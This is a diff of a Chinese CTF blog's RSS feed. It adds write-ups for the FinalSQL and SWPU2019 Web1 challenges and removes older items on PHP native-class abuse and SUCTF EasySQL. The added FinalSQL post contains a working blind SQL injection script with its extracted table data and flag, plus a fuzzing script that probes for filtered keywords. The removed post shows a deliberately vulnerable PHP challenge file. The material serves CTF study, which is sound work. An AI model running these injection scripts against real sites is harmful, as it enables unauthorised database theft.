@@ -12,12 +12,135 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Sun, 13 Jul 2025 18:19:41 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 17 Jul 2025 19:05:10 +0800</lastBuildDate>
     
     
     <atom:link href="https://www.lier.xin/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>极客大挑战 2019_FinalSQL</title>
+      <link>https://www.lier.xin/post/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019_finalsql/</link>
+      <pubDate>Thu, 17 Jul 2025 19:05:10 &#43;0800</pubDate>
+      <author>3310338687@qq.com (Lier)</author>
+      <guid>https://www.lier.xin/post/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019_finalsql/</guid>
+      <description>
+        <![CDATA[<h1>极客大挑战 2019_FinalSQL</h1><p>作者：Lier（3310338687@qq.com）</p>
+        
+          <h2 id="思路">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
+思路
+</h2><p>带点过滤的sql盲注,脚本一把梭</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://79e4ba64-19bf-4394-a0d4-c3d4d8bcb203.node5.buuoj.cn:81/search.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(database())&#34;</span><span class="c1">#geek</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())&#34;</span><span class="c1">#F1naI1y,Flaaaaag</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;Flaaaaag&#39;)&#34;</span><span class="c1">#id,fl4gawsl</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(id,fl4gawsl))from(Flaaaaag)&#34;</span><span class="c1">#1NO!</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)&#34;</span><span class="c1">#id,username,password</span>
+</span></span><span class="line"><span class="cl"><span class="n">select</span><span class="o">=</span><span class="s2">&#34;select(group_concat(id,username,password))from(F1naI1y)&#34;</span><span class="c1">#1mygodcl4y_is_really_amazing,2welcomewelcome_to_my_blog,3sitehttp://www.cl4y.top,4sitehttp://www.cl4y.top,5sitehttp://www.cl4y.top,6sitehttp://www.cl4y.top,7Sycwelcom_to_Syclover,8finallycl4y_really_need_a_grilfriend,9flagflag{5bb6ba67-d838-407c-9c1c-de45fa11a7a3}</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;1^(ascii(substr((</span><span class="si">{</span><span class="n">select</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(r.request.url)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># exit(0)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;ERROR！！！&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">mid</span><span class="o">==</span><span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span><span class="o">==</span><span class="mi">126</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;注入完成，结果为:</span><span class="se">\n</span><span class="s2">[::]&#34;</span><span class="p">,</span><span class="n">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></div><p>找到一个有用的脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 打开读取SQL_fuzz文件</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;SQL_fuzz.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">contents</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(contents)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 删除读取数据中的&#39;\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">contents</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># # 字符串根据空格进行分割</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># d = msg.split(&#39; &#39;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># print(data_list)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 进行fuzz注入</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># GET请求</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="n">data_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 使用time使请求能够拥有足够的时间去响应</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.04</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取过滤网站响应信息</span>
+</span></span><span class="line"><span class="cl">    <span class="n">reponse_txt</span> <span class="o">=</span> <span class="s2">&#34;臭弟弟&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">reponse_txt</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;该网站过滤了</span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># POST请求</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># for d in data_list:</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     payload = {</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         &#34;&#34;: d</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     }</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     r = requests.post(url=url, data=payload)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     reponse_txt = &#34;臭弟弟&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     if (reponse_txt in r.text):</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         print(&#34;该网站过滤了{}&#34;.format(data))</span>
+</span></span></code></pre></div>
+        
+        <hr><p>本文2025-07-17首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-17</p>]]>
+      </description>
+      
+        <category>CTF-Great</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>[SWPU2019]Web1</title>
+      <link>https://www.lier.xin/post/swpu2019web1/</link>
+      <pubDate>Thu, 17 Jul 2025 19:00:53 &#43;0800</pubDate>
+      <author>3310338687@qq.com (Lier)</author>
+      <guid>https://www.lier.xin/post/swpu2019web1/</guid>
+      <description>
+        <![CDATA[<h1>[SWPU2019]Web1</h1><p>作者：Lier（3310338687@qq.com）</p>
+        
+          <h2 id="思路">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
+思路
+</h2><p>1、存在注册界面，先注册个账号登进去</p>
+<p>2、测试一下发布广告</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250717150220596.png" alt="image-20250717150220556"></p>
+<p>题目环境为php，排除cookie伪造</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://43888ac8-6d3b-4f13-be9b-51df2ecf759b.node5.buuoj.cn:81/detail.php?id=1
+</span></span></code></pre></div><h3 id="二次注入">
+<a class="header-anchor" href="#%e4%ba%8c%e6%ac%a1%e6%b3%a8%e5%85%a5"></a>
+二次注入
+</h3><p>该截图配上url，进行sql注入，这里是二次注入</p>
+        
+        <hr><p>本文2025-07-17首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-17</p>]]>
+      </description>
+      
+        <category>CTF-Great</category>
+      
+    </item>
     
     
 
@@ -94,83 +217,6 @@
       </description>
       
         <category>CTF-Great</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>Php原生类利用-1</title>
-      <link>https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/</link>
-      <pubDate>Tue, 08 Jul 2025 17:42:03 &#43;0800</pubDate>
-      <author>3310338687@qq.com (Lier)</author>
-      <guid>https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/</guid>
-      <description>
-        <![CDATA[<h1>Php原生类利用-1</h1><p>作者：Lier（3310338687@qq.com）</p>
-        
-          <h2 id="php原生类-1">
-<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb-1"></a>
-php原生类-1
-</h2><h3 id="php内置的类中存在可利用的魔术方法">
-<a class="header-anchor" href="#php%e5%86%85%e7%bd%ae%e7%9a%84%e7%b1%bb%e4%b8%ad%e5%ad%98%e5%9c%a8%e5%8f%af%e5%88%a9%e7%94%a8%e7%9a%84%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95"></a>
-php内置的类中存在可利用的魔术方法
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">$classes = get_declared_classes();
-</span></span><span class="line"><span class="cl">foreach ($classes as $class) {
-</span></span><span class="line"><span class="cl">    $methods = get_class_methods($class);
-</span></span><span class="line"><span class="cl">    foreach ($methods as $method) {
-</span></span><span class="line"><span class="cl">        if (in_array($method, array(
-</span></span><span class="line"><span class="cl">//            &#39;__destruct&#39;,
-</span></span><span class="line"><span class="cl">            &#39;__toString&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__wakeup&#39;,
-</span></span><span class="line"><span class="cl">//             &#39;__sleep&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__call&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__callStatic&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__get&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__set&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__isset&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__unset&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__invoke&#39;,
-</span></span><span class="line"><span class="cl">//            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
-</span></span><span class="line"><span class="cl">        ))) {
-</span></span><span class="line"><span class="cl">            print $class . &#39;::&#39; . $method . &#34;\n&#34;;
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">} 
-</span></span></code></pre></div><h2 id="php原生类的直接利用">
-<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb%e7%9a%84%e7%9b%b4%e6%8e%a5%e5%88%a9%e7%94%a8"></a>
-php原生类的直接利用
-</h2><h3 id="ctfphp">
-<a class="header-anchor" href="#ctfphp"></a>
-ctf.php
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\$</span><span class="s2">flag_filename = &#39;flag&#39;.md5(???).&#39;php&#39;;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="k">new</span> <span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err">$flag_filename = &#39;flag&#39;.md5(???).&#39;php&#39;;
-</span></span></span></code></pre></div><p>小计<code>trick</code></p>
-        
-        <hr><p>本文2025-07-08首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-08</p>]]>
-      </description>
-      
-        <category>Learning</category>
       
     </item>
     
@@ -557,30 +603,6 @@ Iscc 2025_基本功
 <p>我们直接在当前页面修改一下试试，发现直接跳转到Process.php页面，并且显示黑客入侵无处不在！！！在这里输入信息是没用的！！！</p>
         
         <hr><p>本文2025-06-24首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-24</p>]]>
-      </description>
-      
-        <category>CTF-Great</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>SUCTF 2019_EasySQL</title>
-      <link>https://www.lier.xin/post/suctf-2019_easysql/</link>
-      <pubDate>Fri, 20 Jun 2025 23:37:00 &#43;0800</pubDate>
-      <author>3310338687@qq.com (Lier)</author>
-      <guid>https://www.lier.xin/post/suctf-2019_easysql/</guid>
-      <description>
-        <![CDATA[<h1>SUCTF 2019_EasySQL</h1><p>作者：Lier（3310338687@qq.com）</p>
-        
-          <h2 id="思路">
-<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
-思路
-</h2><p>1、ban了很多东西-关键是<code>and or &amp;&amp; ||</code>等连接词、<code>^</code>可以用
-2、<code>or</code>误伤了<code>information_schema</code>,经过多次尝试发现限制了长度，意味着报错和盲注都无法进行，应该意识到是堆叠注入</p>
-        
-        <hr><p>本文2025-06-20首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-06-20</p>]]>
       </description>
       
         <category>CTF-Great</category>
